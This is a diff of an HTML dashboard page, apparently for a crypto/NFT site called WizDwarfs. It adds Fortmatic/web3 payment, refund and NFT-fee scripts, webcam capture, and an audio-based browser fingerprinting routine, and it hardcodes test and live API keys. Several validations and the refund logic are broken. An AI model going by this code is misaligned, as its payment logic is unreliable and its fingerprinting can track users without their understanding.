@@ -6,12 +6,15 @@
     <title>WizDwarfs</title>
     <meta name='viewport' content='width=device-width, initial-scale=1'>
     <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
-    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
+    <!-- <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css"> -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" >
     <link rel="shortcut icon" type="image/png" href="/images/favicon.png">
     <link href="https://fonts.googleapis.com/css2?family=Lato:wght@300&family=Roboto+Mono:wght@500&display=swap" rel="stylesheet">
-    <link rel='stylesheet' type='text/css' href='/css/main.css'> 
-    <script src='/js/main.js'></script> 
-    
+    <link rel='stylesheet' type='text/css' href='/css/settings.css'>
+    <script src="https://cdn.jsdelivr.net/npm/fortmatic@latest/dist/fortmatic.js"></script> 
+    <script src="https://cdn.jsdelivr.net/gh/ethereum/web3.js@1.0.0-beta.34/dist/web3.js"></script>
+    <script src="https://cdn.jsdelivr.net/gh/ethereum/web3.js@1.0.0-beta.34/dist/web3.min.js"></script>
+    <!-- <script src='/js/main.js'></script>  -->
 </head>
 <body>
       <div class='main-dashboard-div'>
@@ -21,50 +24,652 @@
           </a>
           <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarNavDropdown">
             <span class="navbar-toggler-icon"></span>
-          </button>
-          <div class="collapse navbar-collapse" id="navbarNavDropdown">
+            </button>
+            <div class="collapse navbar-collapse" id="navbarNavDropdown" style="position: absolute;left: 37pc;">
             <ul class="navbar-nav">
               <li class="nav-item active pl-3">
-                <a class="nav-link" href="/dashboard">
-                  <i class="fa fa-home icon-light change-service-color" aria-hidden="true"></i>
-                  Home
-                </a>
+              <a class="nav-link" href="/">
+                <i class="fa fa-home icon-light" aria-hidden="true"></i>
+              </a>
               </li>
-          <li class="nav-item dropdown pl-3">
-            <a class="nav-link dropdown-toggle" href="#" id="navbarDropdownMenuLink" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
-              <i class="fa fa-briefcase change-service-color" aria-hidden="true"></i>
-               Services 
-            </a>
-            <div class="dropdown-menu " aria-labelledby="navbarDropdownMenuLink">
-              <a class="dropdown-item" href="/dashbaord/setting/profile"><i class="fa fa-user-circle-o change-service-color" aria-hidden="true"></i> Edit Profile</a>
-              <a class="dropdown-item" href="/dashboard/setting/pay/credit/add"><i class="fa fa-shopping-cart change-service-color" aria-hidden="true"></i> Monetize</a>
-              <a class="dropdown-item" href="/dashbaord/setting/about"><i class="fa fa-book change-service-color" aria-hidden="true"></i> Biography</a>
+              <li class="nav-item dropdown pl-3">
+              <a class="nav-link dropdown-toggle" href="#" id="navbarDropdownMenuLink" data-toggle="dropdown"
+                aria-haspopup="true" aria-expanded="false">
+                <i class="fa fa-envelope" aria-hidden="true"></i>
+              </a>
+              <div class="dropdown-menu" aria-labelledby="navbarDropdownMenuLink">
+                <a class="dropdown-item active" href="#" title="These message will dispear after few seconds."><i class="fa fa-message" aria-hidden="true"></i> Conversation </a>
+				        <a class="dropdown-item" href="#" title="Gossips"> <i class="fa fa-users" aria-hidden="true"></i> Groups </a>
+                <a class="dropdown-item" href="#" title="All your peers address store here "> <i class="fa fa-address-book"> </i> Peers </a>
+              </div>
+              </li>
+              <li class="nav-item dropdown pl-3">
+              <a class="nav-link dropdown-toggle" href="#" id="navbarDropdownMenuLink" data-toggle="dropdown"
+                aria-haspopup="true" aria-expanded="false">
+                <i class="fa fa-circle-user" aria-hidden="true"></i>
+              </a>
+              <div class="dropdown-menu" aria-labelledby="navbarDropdownMenuLink">
+                <a class="dropdown-item active" href="/dashboard/profile" title="User will edit any information in the profile"><i class="fa fa-sliders" aria-hidden="true"></i>
+                Edit Your Profile
+                </a>
+                <a class="dropdown-item" href="/logout" title="Lock the account"><i class="fa fa-sign-out icon icon-light"
+                  aria-hidden="true"></i>Logout</a>
+                </div>
+              </li>
+            </ul>
             </div>
-          </li>
-         </ul>
-          </div>
-          </nav>
+          </nav> 
       </div>
-      <div class="geo-container">
-        <div class="btn-checkbox">
-          <div class="globe-div">
-            <i class="fa fa-globe" aria-hidden="true"></i> <input type="checkbox" class="checkbox-geo" name="geo" onchange="GeolocationPermission()"> 
-            <span class="span-geo" > Location </span><br>
+          
+          <div class="menu-container" style="display: flex;position: absolute;top: 34pc;left: 35pc;color: transparent;">
+            <div class="btn-group dropup">
+              <button type="button" class="security-button dropdown-toggle" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false" title="Security protocols" style="border: none;color: slategray;">
+                <i class="fa fa-lock" aria-hidden="true"></i>
+              </button>
+              <div class="dropdown-menu" style="border-radius: 18px;">
+                <button class="dropdown-item capture" type="button">
+                  <i class="fa fa-camera" style="color: slategray;"></i> Face capture
+                </button>
+                <button class="dropdown-item analysis" type="button">
+                  <i class="fa fa-fingerprint" style="color: slategray;"></i> Fingerprint
+                </button>
+              </div>
+            </div>
+            <button class="button" class="notify" title="Alerts" style="border: none;color: slategray;position: relative;left: 2pc;">
+              <i class="fa fa-bell"></i>
+            </button>
+            <div class="btn-group dropup">
+              <button class="button" class="wallet dropdown-toggle" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false" title="Monetary Exchange" style="border: none;color: slategray;position: relative;left: 4pc;">
+                <i class="fa fa-helicopter"></i>
+              </button>
+              <div class="dropdown-menu" style="border-radius: 18px;">
+                <button class="dropdown-item buy" type="button">
+                  <i class="fa fa-coins" style="color: slategray;"></i> Send
+                </button>
+                <button class="dropdown-item refund" type="button">
+                  <i class="fa fa-coins" style="color: slategray;"></i> Refund
+                </button>
+              </div>
+            </div>
+            <div class="button-group dropup">
+              <button class="button" class="art dropdown-toggle" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false" title="Virtual Exchange" style="border: none;color: slategray;position: relative;left: 6pc;">
+                <i class="fa fa-palette"></i>
+              </button>
+              <div class="dropdown-menu" style="border-radius: 18px;">
+                <button class="dropdown-item" type="button">
+                  <i class="fa fa-globe" style="color: slategray;"></i> Hand-shake
+                </button>
+                <button class="dropdown-item art" type="button">
+                  <i class="fa fa-paintbrush" style="color: slategray;"></i> NFT
+                </button>
+                <button class="dropdown-item market" type="button">
+                  <i class="fa fa-coins" style="color: slategray;"></i> Marketplace
+                </button>
+              </div>
+            </div>
+            <button class="button" class="keys" title="Keys" style="border: none;color: slategray;position: relative;left: 8pc;">
+              <i class="fa fa-key"></i>
+            </button>
           </div>
-          <div class="notification-div">
-            <i class="fa fa-bell" aria-hidden="true"></i> <input type="checkbox" class="checkbox-notification" id="wizNotify" onchange="NotificationPermission()">
-            <span class="notificate"> Notification</span><br>
-          </div>
-          <div class="ambient-div">
-            <i class="fa fa-lightbulb-o" aria-hidden="true"></i> <input type="checkbox" class="checkbox-ambient" id="wizLight" onchange="AmbientLightPermission()"> 
-            <span class="ambient-class"> Ambient</span> <br>
-          </div>     
-           
-         </div>
         </div>
+
+          <div class=renderer style="display: flex;position: absolute;top: 8pc;left: 18pc;width: 50pc;height: 25.5pc;">
+            <div class="pcontainer" style="display: flex;position: absolute;top: 4pc;height: 20pc;background: whitesmoke;width: 27pc; border-radius: 45px; visibility: hidden;">
+              <i class="fa fa-fingerprint" style="display: flex;position: inherit;top: 11pc;color: silver;transform: scale(15);left: 13pc;"></i>
+            </div>
+            <div class="linebar" style="position: inherit;width: 8pc;height: .2pc;top: 8pc;left: 9pc;background: green;border-radius: 10px; visibility: hidden;"></div>
+            <span class="browser-print" style="display: flex;position: inherit;top: 5pc;left: 15pc;color: slategray;"></span>
+            <div class="face-container" style="display: flex;position: absolute;top: 4pc;height: 20pc;background: whitesmoke;width: 27pc; border-radius: 45px; visibility: hidden;">
+              <video id="video"></video>
+              <button type="button" class="capture_moment" style="display: flex;position: inherit;top: 3pc;left: 24pc;border: none;color: slategray;">
+                <i class="fa fa-camera"></i>
+              </button>
+              <canvas id="canvas" style="display: flex;position: absolute;left: 45pc;width: 22pc;height: 20pc;border-radius: 45px;visibility: hidden;">
+              </canvas>
+              <div class="output-container" style="position: absolute;left: 27pc;">
+                <img id="output"/>
+              </div>
+            </div>
+            <div class="transact" style="visibility: hidden;display: flex;position: initial;width: 46pc;">
+              <div class="transact-container" style="position: inherit;display: flex;width: 46pc;">
+                <input type="text" placeholder="Service Link" class="product_buyer" id="product_buyer" style="display: flex;position: absolute;width: 39pc;height: 4pc;top: 7pc;left: 7pc;border: none;border-radius: 10pc;color:slategray;"/>
+                <input type="text" placeholder="Description" class="product_description" id="product_description" style="display: flex;position: absolute;width: 39pc;height: 4pc;top: 14pc;left: 7pc;border: none;border-radius: 10pc; color:slategray;"/>
+                <input type="number" placeholder="100 Ethereum" class="bought" id="bought" style="display: flex;position: absolute;width: 31pc;height: 4pc;top: 20pc;left: 7pc;border: none;border-radius: 10pc;color:slategray;"/>
+                <!-- <input type="checkbox" class="provider" id="provider" style="display: flex;position: absolute;height: 2pc;top: 21pc;left: 42pc;color:slategray;transform: scale(2.5);">
+                <label class="checkbox-label" for="provider" style="display: flex;position: absolute;width: 31pc;height: 4pc;top: 19pc;left: 40pc;color:slategray;"> Metamask </label> -->
+              </div>
+            </div>
+            <div class="refunding-container" style="visibility: hidden;display: flex;position: absolute;width: 46pc;">
+              <div class="container" style="position: inherit;">
+                <input type="date" class="date_time" style="display: flex;position: absolute;width: 39pc;height: 4pc;top: 7pc;left: 7pc;border: none;border-radius: 10pc;color:slategray;">
+                <input type="text" placeholder="Service Link" class="report" style="display: flex;position: absolute;width: 39pc;height: 4pc;top: 14pc;left: 7pc;border: none;border-radius: 10pc;color:slategray;">
+                <input type="number" placeholder="Refund amount" min="0.0001" class="refund-value" style="display: flex;position: absolute;width: 39pc;height: 4pc;top: 21pc;left: 7pc;border: none;border-radius: 10pc;color:slategray;">
+              </div>
+              </div>
+              <div class="assets-container" style="visibility: hidden;display: flex;position: absolute;width: 46pc;">
+                <div class="container" style="position: inherit;">
+                  <input type="text" placeholder="Token Name" class="token" id="token" style="display: flex;position: absolute;width: 12pc;height: 4pc;top: 7pc;left: 7pc;border: none;border-radius: 10pc;color:slategray;">
+                  <input type="text" placeholder="NFT Object Links (NOLs)" class="nfturl" id="nfturl" style="display: flex;position: absolute;width: 20pc;height: 4pc;top: 7pc;left: 20pc;border: none;border-radius: 10pc;color:slategray;">
+                  <input type="number" placeholder="Auction Starting value" class="price" id="price" style="display: flex;position: absolute;width: 33pc;height: 4pc;top: 12pc;left: 7pc;border: none;border-radius: 10pc;color:slategray;">
+                  <input type="text" placeholder="Description" class="description" id="description" style="display: flex;position: absolute;width: 33pc;height: 4pc;top: 17pc;left: 7pc;border: none;border-radius: 10pc;color:slategray;">
+                </div>
+              </div>
+              <div class="market-container" style="visibility: hidden;display: flex;position: absolute;width: 46pc;">
+                <div class="container" style="position: inherit;">
+                    <a href="#" class="Artists" title="My collectibles" style="display: flex;position: inherit;top: 8pc;left: 16pc;color: darkslategray;width: 15pc;height: 14pc;border: 1px slategrey;border-radius: 10pc;">
+                        <i class="fa fa-paintbrush" style="position: inherit;top: 6pc;left: 4pc;transform: scale(2.5);"></i>
+                    </a>
+                    <a href="#" class="Community" title="Claim Ownership" style="display: flex;position: inherit;top: 8pc;left: 29pc;color: darkslategray;width: 15pc;height: 14pc;border: 1px slategrey;border-radius: 10pc;">
+                      <i class="fa fa-users" style="position: inherit;top: 6pc;left: 4pc;transform: scale(2.5);"></i>
+                    </a>
+                </div>
+              </div>
+            </div>
+          </div>
+      
       <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
       <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
       <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
+      <script>
+
+        // attributes 
+        const _a01 = document.getElementsByClassName('analysis')[0];
+        const _p01 = document.getElementsByClassName('pcontainer')[0];
+        const _scan = document.getElementsByClassName('linebar')[0];
+        const _sp01 = document.getElementsByClassName('browser-print')[0];
+
+        // special-attributes 
+        let audio_ctx = null;
+        let oscillator = null;
+        let dymanicCompressor = null;
+        let samples = null;
+
+        // output
+        let hash = 0;
+        
+        // whenever user clicked on fingerprint button; either fingerprint already scanned then it change initial state => closed state
+        _a01.addEventListener('click', (event) =>{
+          
+          // but the this case it inverse of the above state
+          if (_p01.style.visibility == 'hidden'){
+            
+            // show scanner and start scan browser print
+            _p01.style.visibility = 'visible';
+            _scan.style.visibility = 'visible';
+            
+            // Either User used Chrome, Firefox or Safari
+            const  AudioContext = window.OfflineAudioContext || window.webkitAudioContext;
+            
+            // create audio wave {channels = 1, samplingRate = 5000, waveform per second = 44100}
+            audio_ctx = new AudioContext(1, 5000, 44100);
+            
+            // create oscillator {type = 'sine', frequency = 430hz}
+            oscillator = audio_ctx.createOscillator();
+            oscillator.type = 'sine';
+            oscillator.frequency.value = 430;
+
+            // create compressor {threshold = -36db, knee = 26db, ratio = 11.7db, attack = 0.102s, release = 0.226s}
+            dymanicCompressor = audio_ctx.createDynamicsCompressor();
+            dymanicCompressor.threshold.value = -36;
+            dymanicCompressor.knee.value = 26;
+            dymanicCompressor.ratio.value = 11.7;
+            dymanicCompressor.attack.value = 0.102;
+            dymanicCompressor.release.value = 0.226;
+            
+            // connect components 
+            oscillator.connect(dymanicCompressor);
+            dymanicCompressor.connect(audio_ctx.destination);
+
+            // start oscillator
+            oscillator.start();
+
+            // when a waveform complete 
+            audio_ctx.oncomplete = event =>{
+              samples = event.renderedBuffer.getChannelData(0);
+
+              for (let i=0; i < samples.length; i++){
+                hash += Math.abs(samples[i]);
+              }
+
+              setTimeout(function(){
+                if (hash > 2500){
+                  _p01.children[0].style.color = 'green';
+                  _scan.style.background = 'red';
+                  _sp01.innerHTML = hash;
+                }else{
+                  _p01.children[0].style.color = 'red';
+                  _scan.style.background = 'green';
+                  _sp01.innerHTML = hash;
+                } 
+              }, 20000);
+              
+            }
+            audio_ctx.startRendering();
+          }else{
+            _p01.style.visibility = 'hidden';
+            _scan.style.visibility = 'hidden';
+          }
+        });
+      </script>
+      <script>
+        // html attributes
+        const _p02 = document.getElementsByClassName('face-container')[0];
+        const _b02 = document.getElementsByClassName('capture')[0];
+
+        // local variables 
+        let video, canvas, photo = null;
+        let capture_moment = null;
+
+        // capture your face 
+        _b02.addEventListener('click', event =>{
+          if (_p02.style.visibility == 'hidden'){
+            
+            _p02.style.visibility = 'visible';
+            
+            video = document.getElementById('video');
+            canvas = document.getElementById('canvas');
+            capture_moment = document.getElementsByClassName('capture_moment')[0];
+            photo = document.getElementById('output');
+
+            canvas.style.visibility = 'visible';
+
+            // photoframe attributes
+            var width = 352; 
+            var height = 320;
+
+            // open webcame & record frames per sec
+            navigator.mediaDevices.getUserMedia({ video : true, audio : false}).then((renderbytes) =>{
+              video.srcObject = renderbytes;
+              video.play();
+            }).catch((error) =>{
+              alert("Error ! check your permission #??? ");
+            });
+            
+            // readjust frame attributes
+            let stream = false;
+            video.addEventListener('canplay', (event) =>{
+              if (!stream) {
+                video.setAttribute('width', width);
+                video.setAttribute('height', height);
+                canvas.setAttribute('width', width);
+                canvas.setAttribute('height', height);
+                stream = true;
+              }
+            });
+
+            // capture image
+            capture_moment.addEventListener('click', (event) => {
+              // capture moment
+              
+              if (width && height) {
+                
+                canvas.width = width;
+                canvas.height = height;
+                
+                var context = canvas.getContext('2d');
+                context.drawImage(video, 0, 0, width, height);
+                
+                var data = canvas.toDataURL('image/png');
+                
+                canvas.style.visibility = 'hidden';
+                canvas.fillStyle = '#FFF';
+                
+                photo.setAttribute('src', data);
+              }else{
+                // clear the picture before renderering 
+              
+                var context = canvas.getContext('2d');
+                context.fillStyle = "#AAA";
+                context.fillRect(0, 0, canvas.width, canvas.height);
+              
+              
+                var data = canvas.toDataURL('image/png');
+                photo.setAttribute('src', data);
+
+              }
+              // event.preventDefault();
+            });
+            
+          }else{
+            _p02.style.visibility = 'hidden';
+          }
+        });
+      </script>
+      <script>
+        // html tag attributes 
+        const _i01 = document.getElementsByClassName('bought')[0];
+        const _p03 = document.getElementsByClassName('transact')[0];
+        const _b03 = document.getElementsByClassName('buy')[0];
+
+
+        // const _i02 = document.getElementsByClassName('provider')[0];
+        const _i03 = document.getElementsByClassName('product_buyer')[0];
+
+        // const attributes 
+        const API_KEY = "pk_test_1089727802E62684";
+        const Production_API_KEY = "pk_live_59E7F894747B33ED";
+
+        // local attributes 
+        let valid_price = 0.00;
+
+        // when user trigger send event over.
+        _b03.addEventListener('click', (event) => {    
+
+          if (_p03.style.visibility === 'hidden'){_p03.style.visibility = 'visible';
+            
+          // check whether price field is empty 
+            _i01.addEventListener('change', (event) => {
+              // this condition proceed the transaction if & if this true
+              if (_i01.value > 0.000001) {
+                  
+                  // direct call fortmatic wallet 
+                  var fort_wallet, web3eth = null;
+                  fort_wallet = new Fortmatic(API_KEY);
+                  
+                  // create provider object for web3
+                  web3eth = new Web3(fort_wallet.getProvider());
+                  
+                  // create batch process object for transaction
+                  var batch = new web3eth.eth.BatchRequest();
+  
+                  // if user browser have formatic gateway access then login user account. If account is not created then create
+                  if(!fort_wallet.getProvider().isFortmatic){alert('Fortmatic is not installed'); return}
+                  console.log("application connect with fortmatic provider");
+                  console.log(web3eth.currentProvider.enable());
+                  fort_wallet.user.login().then(()=>{
+                        
+                        var isLogin = fort_wallet.user.isLoggedIn();
+                          
+                        // when a user login , get the public address
+                        if(!isLogin){alert("Fortnight account login Fail"); return}
+                        web3eth.eth.getAccounts().then((account)=>{
+                             
+                             // read user account information
+                             web3eth.eth.getBalance(account[0]).then((balance)=>{
+                                
+                                // if user account have zero balance
+                                let balance_status = balance > _i01.value ? true : false;
+                                if(!balance_status) {alert("You have " + balance + " balance." ); return}
+                              
+                                  // compose invoice 
+                                var txs = {
+                                      to : '0x55057eb78fDbF783C961b4AAd6A5f8BC60cab44B',
+                                      from : account[0],
+                                      value : web3eth.utils.toWei(_i01.value, 'ether'),
+                                }
+                            
+                                // user invoice wait for gateway action after place in batch job
+                                batch.add(web3eth.eth.sendTransaction.request(txs), (error, signed)=>{
+                                  if (error) throw error;
+                                  console.log("message signed: " + signed);
+                                });
+
+                                // perform invoice in batch mode
+                                batch.execute();
+                              });
+                            });
+                          });
+                        }
+                      });
+          }else{_p03.style.visibility = 'hidden';}
+            
+        }); 
+      </script>
+      <script>
+
+        // html attributes
+        const _b04 = document.getElementsByClassName('refund')[0];
+        const _p04 = document.getElementsByClassName('refunding-container')[0];
+        
+        // html input attributes 
+        const _i04 = document.getElementsByClassName('date_time')[0];
+        const _i05 = document.getElementsByClassName('report')[0];
+        const _i06 = document.getElementsByClassName('refund-value')[0];
+
+        // erc20token evmcode
+        const erc20ABI = [{"constant":true,"inputs":[],"name":"name","outputs":[{"name":"","type":"string"}],"payable":false,"stateMutability":"view","type":"function"},
+        {"constant":false,"inputs":[{"name":"spender","type":"address"},
+        {"name":"tokens","type":"uint256"}],"name":"approve","outputs":[{"name":"success","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},
+        {"constant":true,"inputs":[],"name":"totalSupply","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},
+        {"constant":false,"inputs":[{"name":"from","type":"address"},{"name":"to","type":"address"},
+        {"name":"tokens","type":"uint256"}],"name":"transferFrom","outputs":[{"name":"success","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},
+        {"constant":true,"inputs":[],"name":"decimals","outputs":[{"name":"","type":"uint8"}],"payable":false,"stateMutability":"view","type":"function"},
+        {"constant":false,"inputs":[{"name":"amount","type":"uint256"}],"name":"withdrawEther","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},
+        {"constant":true,"inputs":[],"name":"_totalSupply","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},
+        {"constant":true,"inputs":[{"name":"tokenOwner","type":"address"}],"name":"balanceOf","outputs":[{"name":"balance","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},
+        {"constant":false,"inputs":[],"name":"acceptOwnership","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},
+        {"constant":true,"inputs":[],"name":"owner","outputs":[{"name":"","type":"address"}],"payable":false,"stateMutability":"view","type":"function"},
+        {"constant":true,"inputs":[],"name":"symbol","outputs":[{"name":"","type":"string"}],"payable":false,"stateMutability":"view","type":"function"},
+        {"constant":true,"inputs":[{"name":"a","type":"uint256"},{"name":"b","type":"uint256"}],"name":"safeSub","outputs":[{"name":"c","type":"uint256"}],"payable":false,"stateMutability":"pure","type":"function"},
+        {"constant":false,"inputs":[{"name":"to","type":"address"},{"name":"tokens","type":"uint256"}],"name":"transfer","outputs":[{"name":"success","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},
+        {"constant":true,"inputs":[{"name":"a","type":"uint256"},{"name":"b","type":"uint256"}],"name":"safeDiv","outputs":[{"name":"c","type":"uint256"}],"payable":false,"stateMutability":"pure","type":"function"},
+        {"constant":false,"inputs":[{"name":"spender","type":"address"},{"name":"tokens","type":"uint256"},{"name":"data","type":"bytes"}],"name":"approveAndCall","outputs":[{"name":"success","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},
+        {"constant":true,"inputs":[{"name":"a","type":"uint256"},{"name":"b","type":"uint256"}],"name":"safeMul","outputs":[{"name":"c","type":"uint256"}],"payable":false,"stateMutability":"pure","type":"function"},
+        {"constant":true,"inputs":[],"name":"newOwner","outputs":[{"name":"","type":"address"}],"payable":false,"stateMutability":"view","type":"function"},
+        {"constant":false,"inputs":[{"name":"tokenAddress","type":"address"},{"name":"tokens","type":"uint256"}],"name":"transferAnyERC20Token","outputs":[{"name":"success","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},
+        {"constant":true,"inputs":[{"name":"tokenOwner","type":"address"},{"name":"spender","type":"address"}],"name":"allowance","outputs":[{"name":"remaining","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},
+        {"constant":true,"inputs":[{"name":"a","type":"uint256"},{"name":"b","type":"uint256"}],"name":"safeAdd","outputs":[{"name":"c","type":"uint256"}],"payable":false,"stateMutability":"pure","type":"function"},
+        {"constant":false,"inputs":[{"name":"_newOwner","type":"address"}],"name":"transferOwnership","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},
+        {"inputs":[],"payable":false,"stateMutability":"nonpayable","type":"constructor"},
+        {"payable":true,"stateMutability":"payable","type":"fallback"},
+        {"anonymous":false,"inputs":[{"indexed":true,"name":"_from","type":"address"},
+        {"indexed":true,"name":"_to","type":"address"}],"name":"OwnershipTransferred","type":"event"},
+        {"anonymous":false,"inputs":[{"indexed":true,"name":"from","type":"address"},
+        {"indexed":true,"name":"to","type":"address"},
+        {"indexed":false,"name":"tokens","type":"uint256"}],"name":"Transfer","type":"event"},
+        {"anonymous":false,"inputs":[{"indexed":true,"name":"tokenOwner","type":"address"},
+        {"indexed":true,"name":"spender","type":"address"},
+        {"indexed":false,"name":"tokens","type":"uint256"}],"name":"Approval","type":"event"}];
+
+
+        // refund clicked
+        _b04.addEventListener('click', (event) => {
+          if(_p04.style.visibility === 'hidden'){
+            _p04.style.visibility = 'visible';
+           
+            // valid attributes 
+            if (!_i04.value === ''){ alert("Transaction date:", _i04.value); return}
+            if (!_i05.value === ''){ alert("Issue you had faced:", _i05.value); return }
+            if (!_i06.value === ''){ alert("Refund value should be greater than 0.0001"); return}
+            
+            // trigger event
+            _i06.addEventListener('change', (event)=>{
+              if (!_i06.value > 0.000001){ alert('Refund value is too low for transaction'); return}
+                
+              var _wallet, web3 = null;
+              _wallet = new Fortmatic(API_KEY);
+                  
+              // create provider object for web3
+              web3 = new Web3(_wallet.getProvider());
+
+              // if user browser have formatic gateway access then login user account. If account is not created then create
+              if(!_wallet.getProvider().isFortmatic){alert('Fortmatic is not installed'); return}
+                  
+                  console.log("application connect with fortmatic provider");
+                  console.log(web3.currentProvider.enable());
+                  _wallet.user.login().then(()=>{
+                        
+                        var isLogin = _wallet.user.isLoggedIn();
+                          
+                        // when a user login , get the public address
+                        if(!isLogin){alert("Fortnight account login Fail");}
+                        
+                        // check organization balance if that is not enough then regard your request
+                        web3.eth.getBalance('0x55057eb78fDbF783C961b4AAd6A5f8BC60cab44B').then((balance) => {
+                          
+                          let balance_status = balance > _i06.value ? true : false;
+                          if (!balance_status) {alert('Retry operation! Process cannot be completed'); return}
+
+                          // if organization have enough balance then generate address
+                          let generate_address = new web3.eth.abi.encodeEventSignature('refund(string)');
+                          console.log("Generate Address:", generate_address);
+
+                          // generated address attached with new contract that execute on evm.
+                          let contract_address = new web3.eth.Contract([],generate_address, {
+                            from : '0x55057eb78fDbF783C961b4AAd6A5f8BC60cab44B',
+                            gasPrice : 0.00002, 
+                          });
+
+                          console.log("Contract Address:", contract_address);
+                          
+
+                          // execute contract on evm after attached user wallet address
+                          let _contractToken = new web3.eth.Contract(erc20ABI, contract_address);
+                          web3.eth.getAccounts().then((accounts)=>{
+                           const _toAddress = accounts[0];
+
+                            console.log("Account:", _toAddress);
+                          
+                          // calculate contract fees 
+                          let _tokenDec = web3.utils.toBN(18);
+
+                          let _tokenAmountRefund = web3.utils.toBN(_i06.value);
+                          
+                          // let _tokenApproveAmount = web3.utils.toBN(_i06.value);
+                          let _tokenCalculatedTransferValue = web3.utils.toHex(_tokenAmountRefund.mul(web3.utils.toBN(10).pow(_tokenDec)));
+                          let _tokenCalculatedValue = web3.utils.toHex(_tokenAmountRefund.mul(web3.utils.toBN(10).pow(_tokenDec)));
+
+                          const clone_account = _toAddress;
+
+                          // refund money will be approve 
+                          _contractToken.methods.approve(_toAddress, _tokenCalculatedTransferValue)
+                            .send({
+                                from: clone_account,
+                              })
+                            .once('transactionHash', (hash)=>{
+                              console.log(hash);
+                              })
+                            .once('receipt', (receipt)=>{
+                              console.log(receipt);
+                          });
+
+                          // refund money will be refunded
+                          _contractToken.methods.transfer(_toAddress, _tokenCalculatedValue).send({
+                              from : clone_account,
+                            }).once('transactionHash', (hash)=>{
+                              console.log(hash);
+                            }).once('receipt', (receipt)=>{
+                              console.log(receipt);
+                            });
+                          });
+                          
+                      });
+                        
+                  });
+            });
+          }else{
+            _p04.style.visibility = 'hidden';
+          }
+        });
+      </script>
+      <script>
+        const _p05 = document.getElementsByClassName('assets-container')[0];
+        const _b05 = document.getElementsByClassName('art')[0];
+
+        const _i07 = document.getElementsByClassName('token')[0];
+        const _i08 = document.getElementsByClassName('nfturl')[0];
+        const _i09 = document.getElementsByClassName('price')[0];
+        const _i10 = document.getElementsByClassName('description')[0];
+        
+        _b05.addEventListener('click', (event) =>{
+          if (_p05.style.visibility === 'hidden'){
+            _p05.style.visibility = 'visible';
+
+            if (! _i07.value === ''){ alert('Token should not be empty'); }
+            if (!_i08.value === ''){ alert('NFT URL is not specificed'); }
+            if (!_i09.value < 0.0001){ alert('Auction value is not specified');}
+            if (!_i10.value === ''){ alert('Description is too short'); }
+
+            if (_i09.value < 0.00){ alert('Auction value must be between 1 and 100');}
+            _i09.addEventListener('change', (event)=>{
+              // direct call fortmatic wallet 
+              var fort_wallet, web3eth = null;
+                  fort_wallet = new Fortmatic(API_KEY);
+                  
+                  // create provider object for web3
+                  web3eth = new Web3(fort_wallet.getProvider());
+                  
+                  // create batch process object for transaction
+                  var batch = new web3eth.eth.BatchRequest();
+
+                  // different chain (this chain only for nfts);
+                  web3eth.eth.defaultHardfork = 'istanbul';
+
+                  
+  
+                  // if user browser have formatic gateway access then login user account. If account is not created then create
+                  if(!fort_wallet.getProvider().isFortmatic){alert('Fortmatic is not installed'); return}
+                  console.log("application connect with fortmatic provider");
+                  console.log(web3eth.currentProvider.enable());
+                  fort_wallet.user.login().then(()=>{
+                        
+                        var isLogin = fort_wallet.user.isLoggedIn();
+                          
+                        // when a user login , get the public address
+                        if(!isLogin){alert("Fortnight account login Fail"); return}
+                        web3eth.eth.getAccounts().then((account)=>{
+                             
+                             // read user account information
+                             web3eth.eth.getBalance(account[0]).then((balance)=>{
+                                
+                                // if user account have zero balance
+                                let balance_status = balance > (_i09.value + 0.0002) ? true : false;
+                                if(!balance_status) {alert("You have " + balance + " balance." ); return}
+                              
+                                  // compose invoice 
+                                var txs = {
+                                      to : '0x55057eb78fDbF783C961b4AAd6A5f8BC60cab44B',
+                                      from : account[0],
+                                      value : web3eth.utils.toWei(_i09.value, 'ether'),
+                                }
+                            
+                                // user invoice wait for gateway action after place in batch job
+                                batch.add(web3eth.eth.sendTransaction.request(txs), (error, signed)=>{
+                                  if (error) throw error;
+                                  web3eth.eth.sign(txs, txs.from);
+                                });
+
+                                // NFT MINT FEES
+                                var fees = {
+                                      to : '0x55057eb78fDbF783C961b4AAd6A5f8BC60cab44B',
+                                      from : account[0],
+                                      value : web3eth.utils.toWei(_i09.value * 0.2, 'ether'),
+                                }
+
+                                // NFT Fees reduction 
